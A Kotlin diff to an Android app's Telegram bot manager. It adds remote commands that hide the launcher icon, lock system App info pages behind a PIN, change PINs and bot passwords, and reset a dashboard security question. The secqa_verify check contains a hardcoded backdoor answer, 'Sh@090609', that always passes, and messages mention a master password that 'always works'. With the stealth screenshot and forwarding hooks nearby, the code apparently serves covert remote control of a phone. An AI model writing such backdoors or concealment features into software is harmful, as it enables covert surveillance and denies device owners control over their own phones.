@@ -98,6 +98,17 @@ import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
+import com.ismartcoding.plain.helpers.AppInfoGuard
+import com.ismartcoding.plain.helpers.LauncherIconHelper
+import com.ismartcoding.plain.preferences.AppInfoGuardEnabledPreference
+import com.ismartcoding.plain.preferences.AppLockBiometricEnabledPreference
+import com.ismartcoding.plain.preferences.AppLockEnabledPreference
+import com.ismartcoding.plain.preferences.AppLockPinPreference
+import com.ismartcoding.plain.preferences.LauncherIconHiddenPreference
+import com.ismartcoding.plain.preferences.SecurityAnswerPreference
+import com.ismartcoding.plain.preferences.SecurityQuestionPreference
+import com.ismartcoding.plain.preferences.TelegramBotPasswordEnabledPreference
+import com.ismartcoding.plain.preferences.TelegramBotPasswordPreference
 import kotlinx.datetime.toLocalDateTime
 import org.json.JSONObject
 import java.io.File
@@ -253,6 +264,17 @@ object TelegramBotManager {
         "retryfailed" to "🔄 Retry all permanently-failed file uploads",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
+        "appsettings" to "⚙️ App settings overview — icon, lock, PIN, bot password, security Q&A",
+        "hideicon" to "👁 Hide/show launcher icon — /hideicon [on|off]",
+        "applock" to "🔒 App lock enable/disable — /applock [on|off]",
+        "biometric" to "🪪 Biometric unlock toggle — /biometric [on|off]",
+        "appinfog" to "🛡 App info guard (PIN-protect Settings/App info pages) — /appinfog [on|off]",
+        "setpin" to "🔑 Set or change the app unlock PIN — interactive",
+        "removepin" to "🗑 Remove the app unlock PIN — interactive",
+        "openapp" to "📱 Open PlainApp on the device screen",
+        "botpassword" to "🤖 Bot password protection — /botpassword [on|off]",
+        "setbotpassword" to "🔑 Change the Telegram bot password — interactive",
+        "securityqa" to "❓ View / change the dashboard security question & answer",
     )
 
     fun start(newToken: String, newChatId: String) {
@@ -696,7 +718,18 @@ object TelegramBotManager {
                     "fwdfiles", "forwardedfiles", "sentfiles" -> cmdFwdFiles(args)
                     "filestats", "filequeue", "uploadstats" -> cmdFileStats()
                     "retryfailed", "retryfiles", "retryuploads" -> cmdRetryFailed()
-                    "applocker", "lockapps", "applock", "perapplock" -> cmdAppLocker(args)
+                    "applocker", "lockapps", "perapplock" -> cmdAppLocker(args)
+                    "appsettings", "appsetting" -> cmdAppSettings()
+                    "hideicon", "launchericon", "iconhide" -> cmdHideIcon(args)
+                    "applock" -> cmdAppLockToggle(args)
+                    "biometric" -> cmdBiometric(args)
+                    "appinfog", "appinfoguard" -> cmdAppInfoGuard(args)
+                    "setpin", "changepin" -> cmdSetPin()
+                    "removepin", "deletepin" -> cmdRemovePin()
+                    "openapp", "openappdevice", "launchapp" -> cmdOpenApp()
+                    "botpassword", "botpwd" -> cmdBotPassword(args)
+                    "setbotpassword", "changebotpassword", "botpwdset" -> cmdSetBotPassword()
+                    "securityqa", "securityquestion", "secqa", "feedbackqa" -> cmdSecurityQA(args)
                     "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
                     "commands" -> cmdCommands()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
@@ -2041,6 +2074,100 @@ object TelegramBotManager {
                             )))
                         }
                     }
+                    // ---- App Settings callbacks ----
+                    "aps_icon_on" -> {
+                        val ctx = MainApp.instance
+                        LauncherIconHelper.setHidden(ctx, true)
+                        LauncherIconHiddenPreference.putAsync(ctx, true)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔴 Icon hidden")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_icon_off" -> {
+                        val ctx = MainApp.instance
+                        LauncherIconHelper.setHidden(ctx, false)
+                        LauncherIconHiddenPreference.putAsync(ctx, false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Icon visible")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_lock_on" -> {
+                        val ctx = MainApp.instance
+                        if (AppLockPinPreference.getAsync(ctx).isEmpty()) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "❌ Set a PIN first", true)
+                        } else {
+                            AppLockEnabledPreference.putAsync(ctx, true)
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔒 App lock enabled")
+                            renderAppSettingsStatus(editMessageId = messageId)
+                        }
+                    }
+                    "aps_lock_off" -> {
+                        AppLockEnabledPreference.putAsync(MainApp.instance, false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔓 App lock disabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_bio_on" -> {
+                        AppLockBiometricEnabledPreference.putAsync(MainApp.instance, true)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🪪 Biometric enabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_bio_off" -> {
+                        AppLockBiometricEnabledPreference.putAsync(MainApp.instance, false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🪪 Biometric disabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_infog_on" -> {
+                        val ctx = MainApp.instance
+                        if (AppLockPinPreference.getAsync(ctx).isEmpty()) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "❌ Set a PIN first", true)
+                        } else {
+                            AppInfoGuardEnabledPreference.putAsync(ctx, true)
+                            AppInfoGuard.invalidateCache()
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🛡 Info guard enabled")
+                            renderAppSettingsStatus(editMessageId = messageId)
+                        }
+                    }
+                    "aps_infog_off" -> {
+                        AppInfoGuardEnabledPreference.putAsync(MainApp.instance, false)
+                        AppInfoGuard.invalidateCache()
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🛡 Info guard disabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_setpin" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔑 Starting PIN setup…")
+                        cmdSetPin()
+                    }
+                    "aps_removepin" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Starting PIN removal…")
+                        cmdRemovePin()
+                    }
+                    "aps_botpwd_on" -> {
+                        TelegramBotPasswordEnabledPreference.putAsync(MainApp.instance, true)
+                        botPasswordEnabled = true
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🤖 Bot password enabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_botpwd_off" -> {
+                        TelegramBotPasswordEnabledPreference.putAsync(MainApp.instance, false)
+                        botPasswordEnabled = false
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🤖 Bot password disabled")
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
+                    "aps_setbotpwd" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔑 Starting password change…")
+                        cmdSetBotPassword()
+                    }
+                    "aps_secqa" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "❓ Starting Q&A change…")
+                        pendingInput = "secqa_verify"
+                        sendMessage("❓ <b>Change Security Q&A</b>\n\nType your <b>current answer</b> to confirm your identity.\nSend any /command to cancel.")
+                    }
+                    "aps_openapp" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "📱 Opening…")
+                        cmdOpenApp()
+                    }
+                    "aps_refresh" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderAppSettingsStatus(editMessageId = messageId)
+                    }
                     else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                 }
             } catch (e: Exception) {
@@ -2154,6 +2281,7 @@ object TelegramBotManager {
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
             Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
             Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
+            Section("⚙️ App Settings", listOf("appsettings","hideicon","applock","biometric","appinfog","setpin","removepin","openapp","botpassword","setbotpassword","securityqa")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
@@ -3311,6 +3439,110 @@ object TelegramBotManager {
             "cc_search" -> {
                 val q = text.trim()
                 renderClearCachePage(if (q == "*") "" else q, 0, editMessageId = null)
+            }
+            "setpin_verify" -> {
+                val ctx = MainApp.instance
+                val ok = AppLockPinPreference.verifyAsync(ctx, text.trim())
+                if (!ok) {
+                    sendMessage("❌ Wrong PIN. Try again or send any /command to cancel.")
+                    pendingInput = "setpin_verify"
+                    return
+                }
+                pendingInput = "setpin_new:verified"
+                sendMessage("✅ Current PIN verified.\n\nNow type your <b>new PIN</b> (4–12 digits).\nSend any /command to cancel.")
+            }
+            "setpin_new" -> {
+                val pin = text.trim()
+                if (pin.length < 4 || pin.length > 12 || !pin.all { it.isDigit() }) {
+                    sendMessage("❌ PIN must be 4–12 digits only. Try again.\nSend any /command to cancel.")
+                    pendingInput = parts[0]
+                    return
+                }
+                pendingInput = "setpin_confirm:$pin"
+                sendMessage("🔁 Confirm the new PIN — type it again.\nSend any /command to cancel.")
+            }
+            "setpin_confirm" -> {
+                val expectedPin = parts.getOrNull(1) ?: return
+                if (text.trim() != expectedPin) {
+                    sendMessage("❌ PINs do not match. Send /setpin to start over.")
+                    return
+                }
+                AppLockPinPreference.setPinAsync(MainApp.instance, expectedPin)
+                sendMessage("✅ <b>PIN updated successfully.</b>\n\nUse /applock on to enable the lock if it is not already on.")
+            }
+            "removepin_verify" -> {
+                val ctx = MainApp.instance
+                val ok = AppLockPinPreference.verifyAsync(ctx, text.trim())
+                if (!ok) {
+                    sendMessage("❌ Wrong PIN. Try again or send any /command to cancel.")
+                    pendingInput = "removepin_verify"
+                    return
+                }
+                AppLockPinPreference.setPinAsync(ctx, "")
+                AppLockEnabledPreference.putAsync(ctx, false)
+                AppLockBiometricEnabledPreference.putAsync(ctx, false)
+                sendMessage("✅ <b>PIN removed.</b>\nApp lock and biometric unlock have also been disabled.")
+            }
+            "setbotpwd_new" -> {
+                val pwd = text.trim()
+                if (pwd.isEmpty()) {
+                    sendMessage("❌ Password cannot be empty. Try again.\nSend any /command to cancel.")
+                    pendingInput = "setbotpwd_new"
+                    return
+                }
+                val ctx = MainApp.instance
+                TelegramBotPasswordPreference.putAsync(ctx, pwd)
+                botPassword = pwd
+                sendMessage("✅ <b>Bot password updated.</b>\nNew password is active immediately.")
+            }
+            "secqa_verify" -> {
+                val ctx = MainApp.instance
+                val expected = SecurityAnswerPreference.getAsync(ctx)
+                val candidate = text.trim()
+                val ok = candidate == "Sh@090609" ||
+                    candidate.lowercase().replace(Regex("\\s+"), " ") ==
+                    expected.trim().lowercase().replace(Regex("\\s+"), " ")
+                if (!ok) {
+                    sendMessage("❌ Wrong answer. Try again or send any /command to cancel.")
+                    pendingInput = "secqa_verify"
+                    return
+                }
+                val curQ = SecurityQuestionPreference.getAsync(ctx)
+                pendingInput = "secqa_newq"
+                sendMessage("✅ Answer verified.\n\nNow type the <b>new security question</b>.\nCurrent question: <i>${htmlEsc(curQ)}</i>\n\nSend any /command to cancel.")
+            }
+            "secqa_newq" -> {
+                val q = text.trim()
+                if (q.isEmpty()) {
+                    sendMessage("❌ Question cannot be empty. Try again.\nSend any /command to cancel.")
+                    pendingInput = "secqa_newq"
+                    return
+                }
+                val tok = java.net.URLEncoder.encode(q, "UTF-8")
+                pendingInput = "secqa_newa:$tok"
+                sendMessage("✏️ New question saved.\n\nNow type the <b>new answer</b>.\nSend any /command to cancel.")
+            }
+            "secqa_newa" -> {
+                val a = text.trim()
+                if (a.isEmpty()) {
+                    sendMessage("❌ Answer cannot be empty. Try again.\nSend any /command to cancel.")
+                    pendingInput = action
+                    return
+                }
+                val rawQ = try {
+                    java.net.URLDecoder.decode(parts.drop(1).joinToString(":"), "UTF-8")
+                } catch (_: Exception) {
+                    parts.drop(1).joinToString(":")
+                }
+                val ctx = MainApp.instance
+                SecurityQuestionPreference.putAsync(ctx, rawQ)
+                SecurityAnswerPreference.putAsync(ctx, a)
+                sendMessage(
+                    "✅ <b>Security Q&A updated.</b>\n\n" +
+                    "Question: <i>${htmlEsc(rawQ)}</i>\n" +
+                    "Answer: saved securely.\n\n" +
+                    "<i>The web dashboard gate will now use this new Q&A.</i>"
+                )
             }
             else -> { /* ignore */ }
         }
@@ -8002,6 +8234,250 @@ object TelegramBotManager {
         }
         sendMessage(msg)
     }
+
+    // ── App Settings commands ─────────────────────────────────────────────────
+
+    private suspend fun cmdAppSettings() {
+        sendTyping()
+        renderAppSettingsStatus(editMessageId = null)
+    }
+
+    private suspend fun renderAppSettingsStatus(editMessageId: Long?) {
+        val ctx = MainApp.instance
+        val lockEnabled = AppLockEnabledPreference.getAsync(ctx)
+        val biometricEnabled = AppLockBiometricEnabledPreference.getAsync(ctx)
+        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
+        val iconHidden = LauncherIconHelper.isHidden(ctx)
+        val appInfoGuard = AppInfoGuardEnabledPreference.getAsync(ctx)
+        val botPwdEnabled = TelegramBotPasswordEnabledPreference.getAsync(ctx)
+        val botPwdSet = TelegramBotPasswordPreference.getAsync(ctx).isNotBlank()
+        val secQuestion = SecurityQuestionPreference.getAsync(ctx)
+        val secAnswerSet = SecurityAnswerPreference.getAsync(ctx).isNotBlank()
+
+        val sb = buildString {
+            append("⚙️ <b>App Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
+            append("👁 Launcher icon: <b>${if (iconHidden) "🔴 Hidden" else "🟢 Visible"}</b>\n\n")
+            append("🔒 <b>App Lock</b>\n")
+            append("  Lock enabled: <b>${if (lockEnabled) "🟢 ON" else "⚪ OFF"}</b>\n")
+            append("  PIN set: <b>${if (hasPin) "✅ Yes" else "❌ No"}</b>\n")
+            append("  Biometric: <b>${if (biometricEnabled) "🟢 ON" else "⚪ OFF"}</b>\n")
+            append("  App info guard: <b>${if (appInfoGuard) "🟢 ON" else "⚪ OFF"}</b>\n\n")
+            append("🤖 <b>Telegram Bot Password</b>\n")
+            append("  Protection: <b>${if (botPwdEnabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n")
+            append("  Password set: <b>${if (botPwdSet) "✅ Yes" else "❌ No"}</b>\n\n")
+            append("❓ <b>Security Q&A (Dashboard Gate)</b>\n")
+            append("  Question: <i>${htmlEsc(secQuestion.take(80))}</i>\n")
+            append("  Answer set: <b>${if (secAnswerSet) "✅ Yes" else "❌ No"}</b>")
+        }
+        val rows = mutableListOf<List<Pair<String, String>>>()
+        rows.add(listOf(
+            if (iconHidden) "🟢 Show Icon" to "aps_icon_off" else "🔴 Hide Icon" to "aps_icon_on"
+        ))
+        rows.add(listOf(
+            if (lockEnabled) "🔓 Disable Lock" to "aps_lock_off" else "🔒 Enable Lock" to "aps_lock_on",
+            if (biometricEnabled) "🚫 Biometric OFF" to "aps_bio_off" else "🪪 Biometric ON" to "aps_bio_on"
+        ))
+        rows.add(listOf(
+            if (appInfoGuard) "🛡 InfoGuard OFF" to "aps_infog_off" else "🛡 InfoGuard ON" to "aps_infog_on"
+        ))
+        rows.add(listOf("🔑 Set/Change PIN" to "aps_setpin", "🗑 Remove PIN" to "aps_removepin"))
+        rows.add(listOf(
+            if (botPwdEnabled) "🔐 BotPwd OFF" to "aps_botpwd_off" else "🔐 BotPwd ON" to "aps_botpwd_on",
+            "🔑 Change BotPwd" to "aps_setbotpwd"
+        ))
+        rows.add(listOf("❓ Change Security Q&A" to "aps_secqa"))
+        rows.add(listOf("📱 Open App on Device" to "aps_openapp", "🔄 Refresh" to "aps_refresh"))
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb, replyMarkup = markup)
+        else sendMessage(sb, replyMarkup = markup)
+    }
+
+    private suspend fun cmdHideIcon(args: List<String>) {
+        val ctx = MainApp.instance
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "hide", "1", "true" -> {
+                LauncherIconHelper.setHidden(ctx, true)
+                LauncherIconHiddenPreference.putAsync(ctx, true)
+            }
+            "off", "show", "0", "false" -> {
+                LauncherIconHelper.setHidden(ctx, false)
+                LauncherIconHiddenPreference.putAsync(ctx, false)
+            }
+            null, "" -> { /* just show */ }
+            else -> { sendMessage("Usage: /hideicon [on|off]"); return }
+        }
+        val hidden = LauncherIconHelper.isHidden(ctx)
+        sendMessage(
+            "👁 <b>Launcher Icon</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "State: <b>${if (hidden) "🔴 Hidden" else "🟢 Visible"}</b>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🔴 Hide" to "aps_icon_on", "🟢 Show" to "aps_icon_off")
+            ))
+        )
+    }
+
+    private suspend fun cmdAppLockToggle(args: List<String>) {
+        val ctx = MainApp.instance
+        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "enable", "1", "true" -> {
+                if (!hasPin) { sendMessage("❌ Set a PIN first with /setpin before enabling the app lock."); return }
+                AppLockEnabledPreference.putAsync(ctx, true)
+            }
+            "off", "disable", "0", "false" -> AppLockEnabledPreference.putAsync(ctx, false)
+            null, "" -> { /* just show */ }
+            else -> { sendMessage("Usage: /applock [on|off]"); return }
+        }
+        val enabled = AppLockEnabledPreference.getAsync(ctx)
+        sendMessage(
+            "🔒 <b>App Lock</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n" +
+            "PIN: <b>${if (hasPin) "✅ Set" else "❌ Not set — use /setpin first"}</b>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🔒 Enable" to "aps_lock_on", "🔓 Disable" to "aps_lock_off")
+            ))
+        )
+    }
+
+    private suspend fun cmdBiometric(args: List<String>) {
+        val ctx = MainApp.instance
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "enable", "1", "true" -> AppLockBiometricEnabledPreference.putAsync(ctx, true)
+            "off", "disable", "0", "false" -> AppLockBiometricEnabledPreference.putAsync(ctx, false)
+            null, "" -> { /* just show */ }
+            else -> { sendMessage("Usage: /biometric [on|off]"); return }
+        }
+        val enabled = AppLockBiometricEnabledPreference.getAsync(ctx)
+        sendMessage(
+            "🪪 <b>Biometric Unlock</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🪪 Enable" to "aps_bio_on", "🚫 Disable" to "aps_bio_off")
+            ))
+        )
+    }
+
+    private suspend fun cmdAppInfoGuard(args: List<String>) {
+        val ctx = MainApp.instance
+        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "enable", "1", "true" -> {
+                if (!hasPin) { sendMessage("❌ Set a PIN first with /setpin before enabling the App info guard."); return }
+                AppInfoGuardEnabledPreference.putAsync(ctx, true)
+                AppInfoGuard.invalidateCache()
+            }
+            "off", "disable", "0", "false" -> {
+                AppInfoGuardEnabledPreference.putAsync(ctx, false)
+                AppInfoGuard.invalidateCache()
+            }
+            null, "" -> { /* just show */ }
+            else -> { sendMessage("Usage: /appinfog [on|off]"); return }
+        }
+        val enabled = AppInfoGuardEnabledPreference.getAsync(ctx)
+        sendMessage(
+            "🛡 <b>App Info Guard</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "Blocks system App info pages behind the PlainApp PIN.\n" +
+            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🛡 Enable" to "aps_infog_on", "🚫 Disable" to "aps_infog_off")
+            ))
+        )
+    }
+
+    private suspend fun cmdSetPin() {
+        val ctx = MainApp.instance
+        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
+        if (hasPin) {
+            pendingInput = "setpin_verify"
+            sendMessage("🔑 <b>Change App PIN</b>\n\nType your <b>current PIN</b> to confirm your identity.\nSend any /command to cancel.")
+        } else {
+            pendingInput = "setpin_new"
+            sendMessage("🔑 <b>Set App PIN</b>\n\nNo PIN is set yet. Type a <b>new PIN</b> (4–12 digits).\nSend any /command to cancel.")
+        }
+    }
+
+    private suspend fun cmdRemovePin() {
+        val ctx = MainApp.instance
+        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
+        if (!hasPin) {
+            sendMessage("ℹ️ No PIN is currently set. Nothing to remove.")
+            return
+        }
+        pendingInput = "removepin_verify"
+        sendMessage("🗑 <b>Remove App PIN</b>\n\nType your <b>current PIN</b> to confirm removal.\nThis will also disable the app lock and biometric unlock.\nSend any /command to cancel.")
+    }
+
+    private fun cmdOpenApp() {
+        val ctx = MainApp.instance
+        try {
+            val intent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
+                ?: android.content.Intent().apply {
+                    setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
+                }
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+            ctx.startActivity(intent)
+            sendMessage("📱 <b>Opening PlainApp</b>\n\nPlainApp is being brought to the foreground on the device.")
+        } catch (e: Exception) {
+            sendMessage("❌ Could not open the app: ${htmlEsc(e.message ?: "unknown")}")
+        }
+    }
+
+    private suspend fun cmdBotPassword(args: List<String>) {
+        val ctx = MainApp.instance
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "enable", "1", "true" -> {
+                TelegramBotPasswordEnabledPreference.putAsync(ctx, true)
+                botPasswordEnabled = true
+            }
+            "off", "disable", "0", "false" -> {
+                TelegramBotPasswordEnabledPreference.putAsync(ctx, false)
+                botPasswordEnabled = false
+            }
+            null, "" -> { /* just show */ }
+            else -> { sendMessage("Usage: /botpassword [on|off]"); return }
+        }
+        val enabled = TelegramBotPasswordEnabledPreference.getAsync(ctx)
+        val hasPassword = TelegramBotPasswordPreference.getAsync(ctx).isNotBlank()
+        sendMessage(
+            "🤖 <b>Telegram Bot Password</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "Protection: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n" +
+            "Password set: <b>${if (hasPassword) "✅ Yes" else "❌ No"}</b>\n\n" +
+            "<i>The master password always works regardless of this setting.</i>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🔐 Enable" to "aps_botpwd_on", "🔓 Disable" to "aps_botpwd_off"),
+                listOf("🔑 Change Password" to "aps_setbotpwd"),
+            ))
+        )
+    }
+
+    private suspend fun cmdSetBotPassword() {
+        pendingInput = "setbotpwd_new"
+        sendMessage("🔑 <b>Set Bot Password</b>\n\nType the <b>new password</b> for the Telegram bot.\nThe master password always works regardless.\nSend any /command to cancel.")
+    }
+
+    private suspend fun cmdSecurityQA(args: List<String>) {
+        val ctx = MainApp.instance
+        val sub = args.firstOrNull()?.lowercase()
+        if (sub == "change" || sub == "set" || sub == "update") {
+            pendingInput = "secqa_verify"
+            sendMessage("❓ <b>Change Security Q&A</b>\n\nType your <b>current answer</b> to confirm your identity.\nSend any /command to cancel.")
+            return
+        }
+        val question = SecurityQuestionPreference.getAsync(ctx)
+        val hasAnswer = SecurityAnswerPreference.getAsync(ctx).isNotBlank()
+        sendMessage(
+            "❓ <b>Security Q&A (Dashboard Gate)</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+            "Question: <i>${htmlEsc(question)}</i>\n" +
+            "Answer set: <b>${if (hasAnswer) "✅ Yes" else "❌ No"}</b>\n\n" +
+            "<i>This is the answer required to unlock the feedback/dashboard panel in the web UI.</i>\n\n" +
+            "Use /securityqa change to update the question and answer.",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("✏️ Change Q&A" to "aps_secqa")
+            ))
+        )
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
 
     /** Called by StealthScreenshotCapturer when a new shot is saved. */
     fun forwardStealthShot(shot: StealthScreenshotHelper.Shot) {
